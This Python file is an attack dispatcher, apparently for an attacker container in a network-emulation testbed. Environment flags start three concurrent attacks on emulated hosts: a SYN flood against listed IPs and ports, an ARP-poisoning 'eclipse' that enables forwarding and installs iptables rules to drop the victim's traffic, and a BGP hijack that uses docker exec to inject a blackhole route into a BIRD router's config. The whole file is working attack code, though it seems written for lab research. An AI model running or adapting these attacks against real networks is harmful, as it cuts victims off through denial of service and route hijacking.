#!/usr/bin/env python3
"""
Attacker container startup / attack dispatcher.
Runs after the container has finished all other setup.

Controlled entirely via environment variables:
  SYNFLOOD=1         → run continuous SYN-flood against emulator hosts
  ECLIPSE_ARP=1      → run ARP-spoof eclipse attack against Node 162 (10.162.0.71)
                        (L2: ARP poisoning + iptables DROP rules)
  ECLIPSE_BGP=1      → run BGP hijacking eclipse attack against Node 162
                        (L3: blackhole route injected into AS161 BIRD via docker exec)
                        requires /var/run/docker.sock to be mounted

Any combination of flags may be set (including none).  When no flags are set
the dispatcher idles so the container stays alive.  All active attacks run
concurrently in threads; a single SIGTERM/SIGINT triggers an orderly shutdown
of every active attack.
"""

import datetime
import os
import random
import signal
import subprocess
import threading
import time

# ──────────────────────────────────────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────────────────────────────────────
SYNFLOOD_TARGETS = [
    # AS162 host traffic services
    ("10.162.0.71", 80),
    ("10.162.0.71", 23),
    ("10.162.0.71", 53),
    ("10.162.0.71", 8088),
    ("10.162.0.71", 8545),
    ("10.162.0.71", 30303),
    ("10.162.0.72", 80),
    ("10.162.0.72", 23),
    ("10.162.0.72", 53),
    ("10.162.0.72", 8545),
    ("10.162.0.72", 30303),
    ("10.162.0.73", 80),
    ("10.162.0.73", 23),
    ("10.162.0.73", 53),
    ("10.162.0.73", 8545),
    ("10.162.0.73", 30303),
    ("10.162.0.74", 80),
    ("10.162.0.74", 23),
    ("10.162.0.74", 53),
]

SYNFLOOD_FLOOD_DURATION  = 0.1   # seconds each flood runs
SYNFLOOD_BREAK_DURATION  = 240    # seconds of silence between floods

SYNFLOOD_PATH = "/synflood"

# Eclipse ARP attack targets (Node 162 victim + its gateway)
ECLIPSE_VICTIM_IP  = "10.162.0.71"   # Node 162 miner (victim)
ECLIPSE_GATEWAY_IP = "10.162.0.254"  # AS162 border router
ARP_SPOOF_PATH     = "/arp_spoof.py"

# iptables rules installed to block the victim's traffic after ARP poisoning
ECLIPSE_IPTABLES_RULES = [
    ["iptables", "-A", "FORWARD", "-s", ECLIPSE_VICTIM_IP, "-p", "tcp",
     "-j", "REJECT", "--reject-with", "tcp-reset"],
    ["iptables", "-A", "FORWARD", "-d", ECLIPSE_VICTIM_IP, "-p", "tcp",
     "-j", "REJECT", "--reject-with", "tcp-reset"],
    ["iptables", "-A", "FORWARD", "-s", ECLIPSE_VICTIM_IP, "-p", "udp", "-j", "DROP"],
    ["iptables", "-A", "FORWARD", "-d", ECLIPSE_VICTIM_IP, "-p", "udp", "-j", "DROP"],
]

# BGP eclipse: attacker router container and BIRD config
ECLIPSE_BGP_ROUTER_CONTAINER = "as161brd-router0-10.161.0.254"
ECLIPSE_BGP_BIRD_CONF         = "/etc/bird/bird.conf"
ECLIPSE_BGP_HIJACK_MARKER     = "protocol static hijack {"
# Blackhole route block injected into bird.conf
ECLIPSE_BGP_HIJACK_BLOCK = """
protocol static hijack {
    ipv4 {
        table t_direct;
    };
    route 10.162.0.71/32 blackhole;
}
"""

# ──────────────────────────────────────────────────────────────────────────────
# SHUTDOWN EVENT  (set by main()'s signal handler; every attack loop checks it)
# ──────────────────────────────────────────────────────────────────────────────
_shutdown = threading.Event()


# ──────────────────────────────────────────────────────────────────────────────
# LOGGING
# ──────────────────────────────────────────────────────────────────────────────
def log(message: str) -> None:
    timestamp = datetime.datetime.now().isoformat()
    print(f"[{timestamp}] {message}", flush=True)


# ──────────────────────────────────────────────────────────────────────────────
# PROCESS HELPERS
# ──────────────────────────────────────────────────────────────────────────────
def kill_process(proc: subprocess.Popen, name: str = "process") -> None:
    if proc.poll() is not None:
        return
    log(f"Stopping {name} pid={proc.pid}")
    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        log(f"{name} pid={proc.pid} did not stop, killing")
        proc.kill()
        proc.wait()


# ──────────────────────────────────────────────────────────────────────────────
# ENV-VAR FEATURE FLAGS
# ──────────────────────────────────────────────────────────────────────────────
def _flag(envvar: str) -> bool:
    return os.environ.get(envvar, "").strip().lower() in {"1", "true", "yes"}

def synflood_enabled()    -> bool: return _flag("SYNFLOOD")
def eclipse_arp_enabled() -> bool: return _flag("ECLIPSE_ARP")
def eclipse_bgp_enabled() -> bool: return _flag("ECLIPSE_BGP")


# ──────────────────────────────────────────────────────────────────────────────
# SYNFLOOD
# ──────────────────────────────────────────────────────────────────────────────
def _run_synflood_once(target_ip: str, target_port: int) -> subprocess.Popen:
    log(f"synflood: starting against {target_ip}:{target_port}")
    return subprocess.Popen(
        [SYNFLOOD_PATH, target_ip, str(target_port)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def synflood() -> None:
    if not os.path.exists(SYNFLOOD_PATH):
        log(f"synflood: ERROR — binary not found at {SYNFLOOD_PATH}")
        return

    try:
        while not _shutdown.is_set():
            proc = _run_synflood_once(*random.choice(SYNFLOOD_TARGETS))
            # Run for the flood duration, then stop
            _shutdown.wait(timeout=SYNFLOOD_FLOOD_DURATION)
            kill_process(proc, "synflood")
            # Break between floods
            if not _shutdown.is_set():
                log("synflood: pausing between floods")
                _shutdown.wait(timeout=SYNFLOOD_BREAK_DURATION)
    finally:
        log("synflood: shutdown complete")

# ──────────────────────────────────────────────────────────────────────────────
# ECLIPSE — ARP  (L2: ARP poisoning + iptables)
# Runs inside the attacker container (10.162.0.74).
# Poisons the ARP caches of the victim (10.162.0.71) and its gateway
# (10.162.0.254), then installs iptables REJECT/DROP rules so all traffic
# to/from the victim is silently discarded while flowing through us.
# ──────────────────────────────────────────────────────────────────────────────
def _arp_cleanup(arp_proc: subprocess.Popen) -> None:
    log("eclipse_arp: flushing iptables FORWARD chain")
    subprocess.run(["iptables", "-F", "FORWARD"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    kill_process(arp_proc, "arp_spoof")


def eclipse_arp() -> None:
    if not os.path.exists(ARP_SPOOF_PATH):
        log(f"eclipse_arp: ERROR — arp_spoof script not found at {ARP_SPOOF_PATH}")
        return

    # ── Step 1: enable IP forwarding so we can act as a MITM relay ──
    log("eclipse_arp: enabling IP forwarding")
    try:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                       check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log("eclipse_arp: IP forwarding enabled")
    except subprocess.CalledProcessError as exc:
        log(f"eclipse_arp: WARNING — sysctl failed: {exc}")

    # ── Step 2: launch ARP spoofing in the background ────────────────
    log(f"eclipse_arp: starting ARP spoof "
        f"victim={ECLIPSE_VICTIM_IP} gateway={ECLIPSE_GATEWAY_IP}")
    arp_proc = subprocess.Popen(
        ["python3", ARP_SPOOF_PATH],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    # Give it a moment to resolve MACs and send the first poison packets.
    time.sleep(3)
    if arp_proc.poll() is not None:
        log("eclipse_arp: ERROR — arp_spoof process exited immediately; aborting")
        return
    log(f"eclipse_arp: ARP spoof running (pid={arp_proc.pid})")

    # ── Step 3: install iptables DROP/REJECT rules ───────────────────
    log("eclipse_arp: installing iptables rules")
    for rule in ECLIPSE_IPTABLES_RULES:
        try:
            subprocess.run(rule, check=True,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError as exc:
            log(f"eclipse_arp: WARNING — iptables rule failed: {exc}")
    log("eclipse_arp: iptables DROP rules installed — victim is now eclipsed")

    # ── Step 4: keep running; restart spoof if it dies ───────────────
    try:
        while not _shutdown.wait(timeout=10):
            if arp_proc.poll() is not None:
                log("eclipse_arp: ARP spoof process died, restarting")
                arp_proc = subprocess.Popen(
                    ["python3", ARP_SPOOF_PATH],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                log(f"eclipse_arp: ARP spoof restarted (pid={arp_proc.pid})")
    finally:
        _arp_cleanup(arp_proc)
        log("eclipse_arp: shutdown complete")


# ──────────────────────────────────────────────────────────────────────────────
# ECLIPSE — BGP  (L3: blackhole route via BIRD)
# Runs inside the attacker container but operates on the AS161 border router
# via `docker exec`; requires /var/run/docker.sock to be mounted.
# Injects a /32 blackhole route for the victim into bird.conf, reloads BIRD
# (which sends a BGP UPDATE to the route server), and holds the route until
# shutdown — at which point it removes the block and reconfigures BIRD to
# send the BGP WITHDRAW, restoring normal routing.
# ──────────────────────────────────────────────────────────────────────────────
def _bgp_docker_exec(cmd: str, check: bool = True) -> str:
    """Run a shell command inside the AS161 border router container."""
    full = ["docker", "exec", ECLIPSE_BGP_ROUTER_CONTAINER, "sh", "-c", cmd]
    r = subprocess.run(full, capture_output=True, text=True)
    if check and r.returncode != 0:
        raise RuntimeError(
            f"docker exec [{ECLIPSE_BGP_ROUTER_CONTAINER}] failed: {r.stderr.strip()}"
        )
    return r.stdout.strip()


def _bgp_conf_has_hijack() -> bool:
    content = _bgp_docker_exec(f"cat {ECLIPSE_BGP_BIRD_CONF}", check=False)
    return ECLIPSE_BGP_HIJACK_MARKER in content


def _bgp_inject_hijack() -> None:
    escaped = ECLIPSE_BGP_HIJACK_BLOCK.replace("'", "'\\''")
    _bgp_docker_exec(f"printf '%s' '{escaped}' >> {ECLIPSE_BGP_BIRD_CONF}")


def _bgp_remove_hijack() -> None:
    _bgp_docker_exec(
        f"sed -i '/protocol static hijack/,/^}}/d' {ECLIPSE_BGP_BIRD_CONF}",
        check=False,
    )


def _bgp_birdc_configure() -> str:
    out = _bgp_docker_exec("birdc configure", check=False)
    log(f"eclipse_bgp: birdc → {out.strip()}")
    return out


def _bgp_cleanup() -> None:
    log("eclipse_bgp: removing hijack block from bird.conf")
    _bgp_remove_hijack()
    log("eclipse_bgp: reloading BIRD (sending BGP WITHDRAW)")
    _bgp_birdc_configure()
    log("eclipse_bgp: BGP route restored")


def eclipse_bgp() -> None:
    # ── Verify docker socket is accessible ───────────────────────────
    if not os.path.exists("/var/run/docker.sock"):
        log("eclipse_bgp: ERROR — /var/run/docker.sock not found; "
            "mount it with -v /var/run/docker.sock:/var/run/docker.sock")
        return

    # ── Clean up any leftover hijack block from a previous run ───────
    if _bgp_conf_has_hijack():
        log("eclipse_bgp: WARNING — stale hijack block found in bird.conf; removing first")
        _bgp_remove_hijack()
        _bgp_birdc_configure()
        time.sleep(3)

    # ── Step 1: inject the malicious blackhole route ──────────────────
    log(f"eclipse_bgp: injecting blackhole route for {ECLIPSE_VICTIM_IP}/32 "
        f"into {ECLIPSE_BGP_BIRD_CONF}")
    try:
        _bgp_inject_hijack()
    except RuntimeError as exc:
        log(f"eclipse_bgp: ERROR — could not write to bird.conf: {exc}")
        return

    if not _bgp_conf_has_hijack():
        log("eclipse_bgp: ERROR — hijack block not found after write; aborting")
        return
    log("eclipse_bgp: blackhole route block written to bird.conf")

    # ── Step 2: reload BIRD to propagate the BGP UPDATE ──────────────
    log("eclipse_bgp: reloading BIRD config (sending BGP UPDATE to route server)")
    out = _bgp_birdc_configure()
    if "econfigured" in out.lower():
        log("eclipse_bgp: BIRD reconfigured — BGP UPDATE sent, victim is now eclipsed")
    else:
        log(f"eclipse_bgp: WARNING — unexpected birdc output: {out.strip()!r}")

    # ── Step 3: hold the route; re-inject if clobbered ───────────────
    log("eclipse_bgp: holding BGP blackhole route")
    try:
        while not _shutdown.wait(timeout=30):
            if not _bgp_conf_has_hijack():
                log("eclipse_bgp: WARNING — hijack block disappeared; re-injecting")
                try:
                    _bgp_inject_hijack()
                    _bgp_birdc_configure()
                    log("eclipse_bgp: blackhole route re-injected")
                except RuntimeError as exc:
                    log(f"eclipse_bgp: ERROR — re-injection failed: {exc}")
    finally:
        _bgp_cleanup()
        log("eclipse_bgp: shutdown complete")


# ──────────────────────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────────────────────
def main() -> None:
    import socket
    hostname = socket.gethostname()
    log(f"Attacker node '{hostname}' attack dispatcher starting")

    # ── Collect enabled attacks ───────────────────────────────────────
    ATTACKS = {
        "synflood":    (synflood_enabled,    synflood),
        "eclipse_arp": (eclipse_arp_enabled, eclipse_arp),
        "eclipse_bgp": (eclipse_bgp_enabled, eclipse_bgp),
    }

    active_fns = []
    for name, (enabled_fn, attack_fn) in ATTACKS.items():
        if enabled_fn():
            log(f"{name.upper()} enabled")
            active_fns.append((name, attack_fn))
        else:
            log(f"{name.upper()} disabled (set {name.upper()}=1 to enable)")

    # ── Signal handler: set the shared event, then let threads finish ─
    def _handle_signal(signum, frame):
        log(f"Received signal {signum} — shutting down all attacks")
        _shutdown.set()

    signal.signal(signal.SIGINT,  _handle_signal)
    signal.signal(signal.SIGTERM, _handle_signal)

    if not active_fns:
        log("No attacks enabled — idling (set SYNFLOOD/ECLIPSE_ARP/ECLIPSE_BGP=1 to enable)")
        _shutdown.wait()   # unblocks on SIGTERM/SIGINT via _handle_signal
        return

    # ── Launch every active attack in its own thread ──────────────────
    threads = [
        threading.Thread(target=fn, name=name, daemon=True)
        for name, fn in active_fns
    ]
    for t in threads:
        t.start()
        log(f"Started thread: {t.name}")

    # ── Wait until shutdown is signalled, then join all threads ───────
    _shutdown.wait()
    log("Shutdown signalled — waiting for attack threads to finish")
    for t in threads:
        t.join(timeout=15)
        if t.is_alive():
            log(f"WARNING: thread {t.name} did not finish within timeout")

    log("All attacks stopped — exiting")


if __name__ == "__main__":
    main()